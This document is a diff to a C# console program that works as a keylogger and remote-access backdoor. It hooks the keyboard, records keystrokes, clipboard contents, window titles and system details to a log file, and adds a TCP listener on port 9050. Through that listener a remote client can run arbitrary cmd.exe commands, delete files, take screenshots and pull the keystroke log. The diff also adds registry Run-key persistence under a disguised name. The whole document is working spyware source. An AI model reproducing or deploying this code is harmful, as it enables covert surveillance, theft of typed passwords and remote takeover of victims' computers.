@@ -13,14 +13,17 @@ using System.Threading;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Security.Permissions;
-
+using Microsoft.Win32;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Diagnostics;
 
 
 namespace ConsoleApp2
 {
     class Program
     {
-
+        const int SW_HIDE = 0;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_KEYUP = 0x0101;
@@ -49,9 +52,14 @@ namespace ConsoleApp2
         {
             var handle = GetConsoleWindow();
 
-            // Hide
-            //ShowWindow(handle, SW_HIDE);
-            ShowWindow(handle, 1);
+            /*  (new System.Threading.Thread(delegate () {
+                    ServerSocket();
+              })).Start();
+
+  */
+
+//             ShowWindow(handle, SW_HIDE);
+           ShowWindow(handle, 1);
             dictionaryRusEng.Add('Q', 'Й');
             dictionaryRusEng.Add('W', 'Ц');
             dictionaryRusEng.Add('E', 'У');
@@ -107,51 +115,28 @@ namespace ConsoleApp2
             _hookID = SetHook(_proc);
             // получаем переменные окружения и данные о пользователе
 
-            /* Writer(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
-             Writer(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
-             Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
-             Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
-             Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
-             Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
-             Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
 
-             */
+            Writer("\n========================================================================================================================\n\nCurrentDirectory: " + Environment.CurrentDirectory + "\n");
+            Writer("MachineName: " + Environment.MachineName + "\n");
+            Writer("OSVersion: " + Environment.OSVersion.ToString() + "\n");
+            Writer("SystemDirectory: " + Environment.SystemDirectory + "\n");
+            Writer("UserDomainName: " + Environment.UserDomainName + "\n");
+            Writer("UserInteractive: " + Environment.UserInteractive + "\n");
+            Writer("UserName: " + Environment.UserName + "\n\n========================================================================================================================\n\n");
 
-            Writer("\n========================================================================================================================\n\nCurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
-            Writer("MachineName: {0}" + Environment.MachineName + "\n");
-            Writer("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n");
-            Writer("SystemDirectory: {0}" + Environment.SystemDirectory + "\n");
-            Writer("UserDomainName: {0}" + Environment.UserDomainName + "\n");
-            Writer("UserInteractive: {0}" + Environment.UserInteractive + "\n");
-            Writer("UserName: {0}" + Environment.UserName + "\n\n========================================================================================================================\n\n");
-
-
-            //  Writer(Decrypt(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"), "Key"));
-
-            //Writer(Decrypt(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"), "Key"));
-            //   Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
-            // Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
-            // Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
-            //  Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
-            //Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
 
             // получаем буфер обмена при запуске
             string htmlData = GetBuff();
-            //     Console.WriteLine("Clipboard: {0}\n", htmlData);
+            Console.WriteLine("Clipboard: {0}\n", htmlData);
 
             // получаем текущую раскладку клавиатуры
-
             ushort lang = GetKeyboardLayout();
-            //    Console.WriteLine("kl {0}",lang);
+
             mss = lang.ToString();
-            //  Console.WriteLine("Первоначальная раскладка: {0}\n", lang.ToString());
-            // Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
             Writer("Original keyboard layout: " + mss + "\n");
             Thread mtr = new System.Threading.Thread(ServerSocket);
             mtr.Start();
             Application.Run();
-
-
             UnhookWindowsHookEx(_hookID);
         }
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -168,11 +153,11 @@ namespace ConsoleApp2
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
 
-      static string PreviousProgram="";
+        static string PreviousProgram = "";
 
-        private static IntPtr HookCallback(int nCode,IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-         
+
             if (nCode >= 0)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -182,7 +167,7 @@ namespace ConsoleApp2
                     PreviousProgram = CurrentProgram;
                     string time = DateTime.Now.ToString();
                     Writer("\n\t[Program: " + CurrentProgram + "\n\tDateTime: " + time + "]\n");
-                 //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n");
+                    //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n");
                 }
 
 
@@ -193,12 +178,12 @@ namespace ConsoleApp2
                 string original = mystring;
                 string encrypted;
 
-               ///
+                ///
                 bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                 bool sh = Control.ModifierKeys != Keys.Shift;
-                
-             //   if (original.Length==1 && !capsLock) { original = original.ToLower(); }
-               // if (original.Length==1 && !sh){ original = original.ToLower(); }
+
+                //   if (original.Length==1 && !capsLock) { original = original.ToLower(); }
+                // if (original.Length==1 && !sh){ original = original.ToLower(); }
                 // запрашиваем раскладку клавиатуры для каждого символа
 
 
@@ -217,18 +202,19 @@ namespace ConsoleApp2
 
                 if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                 {
-                    if (GetKeyboardLayout() == 1049 && original.Length==1)
+                    if (GetKeyboardLayout() == 1049 && original.Length == 1)
                     {
                         original = Russian(original[0]);
                     }
 
-                    if (original.Length==1 && capsLock && char.IsLetter(original[0])) {
-                      
-                         original = ChangeRegister(original[0]);
+                    if (original.Length == 1 && capsLock && char.IsLetter(original[0]))
+                    {
+
+                        original = ChangeRegister(original[0]);
                     }
-                    if (original.Length==1 && sh && char.IsLetter(original[0]))
-                    { 
-                        original = ChangeRegister(original[0]); 
+                    if (original.Length == 1 && sh && char.IsLetter(original[0]))
+                    {
+                        original = ChangeRegister(original[0]);
                     }
 
                     if (original.Length == 1 && !sh && (char.IsDigit(original[0]) || original[0] == '`' || original[0] == '-' || original[0] == '='))
@@ -237,25 +223,25 @@ namespace ConsoleApp2
                     }
 
                     //Writer(Encrypt(original, "Key"));
-                   if(original.Length==1)
-                    Writer(original);
-                    
+                    if (original.Length == 1)
+                        Writer(original);
+
                 }
 
                 if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                 {
                     if (Keys.LControlKey == (Keys)vkCode)
                     {
-                     //   Writer("<"+original+">");
+                        //   Writer("<"+original+">");
                         //Writer(Encrypt(original, "Key")); 
                     } // если был отпущен = запись
                     if (Keys.LShiftKey == (Keys)vkCode)
                     {
-                      //  Writer("<"+original+">");
+                        //  Writer("<"+original+">");
                         //Writer(Encrypt(original, "Key")); 
                     } // если был отпущен = запись
 
-                    if(Keys.Space == (Keys)vkCode)
+                    if (Keys.Space == (Keys)vkCode)
                     {
                         Writer(" ");
                     }
@@ -273,10 +259,10 @@ namespace ConsoleApp2
                         Writer("<backspace>");
                     }
 
-                    if(Keys.OemOpenBrackets == (Keys)vkCode )
+                    if (Keys.OemOpenBrackets == (Keys)vkCode)
                     {
                         char sym;
-                        if (lang_check == 1033 || lang_check ==0)
+                        if (lang_check == 1033 || lang_check == 0)
                         {
                             if (Keys.Shift == Control.ModifierKeys) { Writer("{"); }
                             else Writer("[");
@@ -295,7 +281,7 @@ namespace ConsoleApp2
                             Writer(sym.ToString());
                         }
 
-                       
+
                     }
 
                     if (Keys.OemCloseBrackets == (Keys)vkCode)
@@ -323,7 +309,7 @@ namespace ConsoleApp2
 
                     }
 
-                  
+
 
                     if (Keys.Oem5 == (Keys)vkCode && Keys.Shift != Control.ModifierKeys)
                     {
@@ -333,9 +319,9 @@ namespace ConsoleApp2
                     if (Keys.Oem5 == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
                     {
                         Writer("|");
-                    } 
+                    }
 
-              
+
                     if (Keys.Oem7 == (Keys)vkCode)
                     {
                         char sym;
@@ -383,7 +369,7 @@ namespace ConsoleApp2
 
                     if (Keys.OemQuestion == (Keys)vkCode)
                     {
-                      
+
                         if (lang_check == 1033 || lang_check == 0)
                         {
                             if (Keys.Shift == Control.ModifierKeys) { Writer("?"); }
@@ -499,14 +485,14 @@ namespace ConsoleApp2
                 else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-          
+
                     encrypted = Encrypt("\t<NEW>\n", "Key");
                     //Writer(encrypted);
                     Writer("\n\t<NEW>\n");
                 }
                 else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
-                    
+
                     encrypted = Encrypt("\t<CTRL+T>\n", "Key");
                     Writer("\n\t<CTRL T>\n");
                     // Writer(encrypted);
@@ -515,13 +501,13 @@ namespace ConsoleApp2
                 else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                 {
 
-                    
+
                     encrypted = Encrypt("\n\t<CUT>\n", "Key");
                     //Writer(encrypted);
                     Writer("\n\t<CUT>\n");
                 }
 
-            //    Console.WriteLine("Original:   {0}", original);
+                //    Console.WriteLine("Original:   {0}", original);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -533,8 +519,6 @@ namespace ConsoleApp2
             return htmlData;
         }
 
-
-        // Записываем шифрованный текст в файл
 
         public static void Writer(string inputstring)
         {
@@ -586,9 +570,6 @@ namespace ConsoleApp2
             return Convert.ToBase64String(cipherTextBytes);
         }
 
-
-
-
         public static string Decrypt(string encryptedText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
         {
             if (string.IsNullOrEmpty(encryptedText))
@@ -629,7 +610,6 @@ namespace ConsoleApp2
             symmetricKey.Clear();
             return Convert.ToBase64String(decryptedTextBytes);
         }
-
 
         private static string GetActiveWindowTitle()
         {
@@ -673,7 +653,6 @@ namespace ConsoleApp2
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
-        const int SW_HIDE = 0;
 
         //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//
 
@@ -699,10 +678,6 @@ namespace ConsoleApp2
             return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
         }
 
-
-
-
-
         public static string Russian(char sym)
         {
             if (char.IsLetter(sym))
@@ -713,7 +688,7 @@ namespace ConsoleApp2
         }
 
 
-        public static string ChangeRegister(char  sym)
+        public static string ChangeRegister(char sym)
         {
             if (char.IsLower(sym))
             {
@@ -732,49 +707,395 @@ namespace ConsoleApp2
             return dictionaryDigits[sym].ToString();
         }
 
+        public static void Screenshot()
+        {
+            Graphics graph = null;
+            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            graph = Graphics.FromImage(bmp);
+            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+            Console.WriteLine(Application.StartupPath + @"\screen.bmp");
+            bmp.Save(Application.StartupPath + @"\screen.jpg");
+        }
+
+
+        const string autorunProgName = "Ha ABT06YCE";
+
+        public static void SetAutorunValue(bool autorun, Socket sender)
+        {
+            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autorun)
+                {
+                    reg.SetValue(autorunProgName, ExePath);
+                    SSend("Успешно установлено", sender);
+                }
+                else
+                {
+                    reg.DeleteValue(autorunProgName);
+                    SSend("Успешно удалено", sender);
+                }
+                reg.Close();
+            }
+            catch (Exception e)
+            {
+                SSend(e.Message, sender);
+            }
+        }
+
+
+
+
+
+
+
+
+
+
+
+        public static void NewProcess(string s, string f1, Socket client)
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = s;
+            process.StartInfo.Arguments = f1;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.Verb = "runas";
+            process.Start();
+
+            StreamReader reader = process.StandardOutput;
+            string output = reader.ReadToEnd();
+
+            SSend(output, client);
+            process.WaitForExit();
+            process.Close();
+            SSend("\n\nPress an key to exit", client);
+        }
+
+
+
+
+
+
+        public static void SSend(string reply, Socket client)
+        {
+            byte[] msg = Encoding.UTF8.GetBytes(reply);
+            client.Send(msg);
+        }
 
 
         public static void ServerSocket()
         {
+
+            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
+            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+            newsock.Bind(ipep);
+            newsock.Listen(10);
+            Console.WriteLine("Waiting for a client...");
+
             while (true)
             {
                 {
                     try
                     {
-                        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
-                        Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        newsock.Bind(ipep);
-                        newsock.Listen(10);
-                        Console.WriteLine("Waiting for a client...");
+
+
                         Socket client = newsock.Accept();
                         IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
                         Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
-                        // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
-                        // string fsize= fi.Length.ToString();
-                        try
-                        {
 
-                            client.SendFile(Application.StartupPath + @"\log.dat");
-                            Console.WriteLine("Disconnected from {0}", clientep.Address);
-                            client.Close();
-                            newsock.Close();
+                        string data = null;
+
+
+                        byte[] bytes = new byte[1024 * 1024];
+                        int bytesRec = client.Receive(bytes);
+                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);
+
+                        Console.Write("Полученный текст: " + data + "\n\n");
+
+
+                        // string data = Console.ReadLine();
+
+                        var splitChars = new[] { ' ' };
+                        string Arguments = "";
+
+                        string[] a = data.Split(splitChars, 2);
+                        string fileName = a[0];
+                        if (a.Length > 1) Arguments = a[1];
+
+
+                        switch (fileName)
+                        {
+                            case "ipconfig":
+
+                                NewProcess("ipconfig", Arguments, client);
+                                break;
+
+                            case "help":
+                                SSend("\nСинтаксис: cmd params <Enter>\nПримеры:\ncmd taskkill /IM notepad.exe /f" +
+                                "\ncmd tasklist	\ncmd ipconfig /all\ncmd notepad.exe\n\nУдаление файлов:\ndel path_to_file или cmd del path_to file" +
+                                "\nscreen - отпраивть скриншот экрана\n" +
+                                "\nlog - отправляет лог-файл клиенту\n\n", client);
+                                break;
+                            case "quit":
+
+                                SSend("BYE!", client);
+                                break;
+
+                            case "cmd":
+
+                                if (Arguments.Length == 0)
+                                {
+                                    Console.WriteLine("Для команды флаги обязательны");
+                                    SSend("Для команды флаги обязательны", client);
+                                    break;
+                                }
+
+                                NewProcess("cmd.exe", "/C" + Arguments, client);
+                                break;
+
+                            case "del":
+                                if (Arguments.Length == 0)
+                                {
+                                    Console.WriteLine("Для команды флаги обязательны");
+                                    SSend("Для команды флаги обязательны", client);
+                                    break;
+                                }
+                                FileInfo fi2 = new FileInfo(Arguments);
+                                try
+                                {
+
+                                    fi2.Delete();
+                                    SSend("Файл удален", client);
+
+                                }
+                                catch (Exception ex)
+
+                                {
+                                    SSend(ex.ToString(), client);
+                                    break;
+                                }
+
+                                break;
+
+                            default:
+                                SSend("Невыполнимая команда. Попробуйте HELP", client);
+                                break;
 
                         }
-                        catch (Exception ex)
+
+                        //////////////////////////////////////////////////
+                        if (fileName == "screen")
                         {
-                            Console.Write(ex.Message);
+                            Screenshot();
+                            try
+                            {
+                                SocketWorker(@"\screen.jpg", client);
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.Write(ex.Message);
+
+                            }
+
                         }
+
+                        if (fileName == "log")
+                        {
+                            Screenshot();
+                            try
+                            {
+
+                                SocketWorker(@"\log.dat", client);
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.Write(ex.Message);
+                            }
+
+                        }
+
+
+
                     }
 
                     catch (Exception e)
                     {
                         Console.Write(e.Message);
+
                     }
 
 
                 }
             }
+        }
+
+        public static void ServerSocket2()
+        {
+            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
+            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            newsock.Bind(ipep);
+            newsock.Listen(10);
+            Console.WriteLine("Waiting for a client...");
+            while (true)
+            {
+                {
+                    try
+                    {
+                        Socket client = newsock.Accept();
+                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
+                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
+
+                        string data = null;
+                        byte[] bytes = new byte[1024 * 1024];
+                        int bytesRec = client.Receive(bytes);
+                        data += Encoding.UTF8.GetString(bytes, 0, bytesRec);
+                        Console.WriteLine("Полученное сообщение: " + data + "\n\n");
+
+                        var splitChars = new[] { ' ' };
+                        string Arguments = "";
+
+                        string[] a = data.Split(splitChars, 2);
+                        string fileName = a[0];
+                        if (a.Length > 1) Arguments = a[1];
+
+                        switch (fileName)
+                        {
+                            case "ipconfig":
+                                NewProcess("ipconfig", Arguments, client);
+                                break;
+                            case "cmd":
+                                if (Arguments.Length == 0)
+                                {
+                                    Console.WriteLine("Флаги обязательны");
+                                    SSend("Флаги обязательны", client);
+                                    break;
+                                }
+                                NewProcess("cmd.exe", "/c" + Arguments, client);
+                                break;
+                            case "del":
+                                if (Arguments.Length == 0)
+                                {
+                                    Console.WriteLine("Флаги обязательны");
+                                    SSend("Флаги обязательны", client);
+                                    break;
+                                }
+                                FileInfo fi2 = new FileInfo(Arguments);
+                                try
+                                {
+                                    fi2.Delete();
+                                    SSend("файл удален", client);
+
+                                }
+                                catch (Exception ex)
+                                {
+                                    SSend(ex.ToString(), client);
+                                    break;
+                                }
+                                break;
+                            default:
+                                SSend("Невыполнимая команда. HELP", client);
+                                break;
+                        }
+                        if (fileName == "screen")
+                        {
+                            Screenshot();
+                            try
+                            {
+                                SocketWorker(@"\screen.jpg", client);
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine(e.Message);
+                            }
+                        }
+                        if (fileName == "log")
+                        {
+                            Screenshot();
+                            try
+                            {
+                                SocketWorker(@"log.dat", client);
+
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine(e.Message);
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message);
+                    }
+                }
+            }
+        }
+
+        public static void SocketWorker(string fileName, Socket client)
+        {
+            string filePath = Application.StartupPath;
+            byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);
+            byte[] fileData = File.ReadAllBytes(filePath + fileName);
+            byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
+            byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);
+
+            fileNameLen.CopyTo(clientData, 0);
+            fileNameByte.CopyTo(clientData, 4);
+            fileData.CopyTo(clientData, 4 + fileNameByte.Length);
+
+            client.Send(clientData);
+            Console.WriteLine("File:{0} has been sent", fileName);
+        }
+
+
+        public static void ServerSocket3()
+        {
+            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
+            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            try
+            {
+                newsock.Bind(ipep);
+                newsock.Listen(10);
+                Console.WriteLine("Waiting for a client...");
+
+                while (true)
+                {
+                    Socket client = newsock.Accept();
+                    IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
+                    Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
+                    string data = null;
+                    FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
+                    string fsize = fi.Length.ToString();
+                    try
+                    {
+
+                        client.SendFile(Application.StartupPath + @"\log.dat");
+                        Console.WriteLine("Disconnected from {0}", clientep.Address);
+                        client.Close();
+                        newsock.Close();
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.Write(ex.Message);
+                    }
+                }
+            }
+
+            catch (Exception e)
+            {
+                Console.Write(e.Message);
+            }
 
         }
+
+
+
     }
+
 }
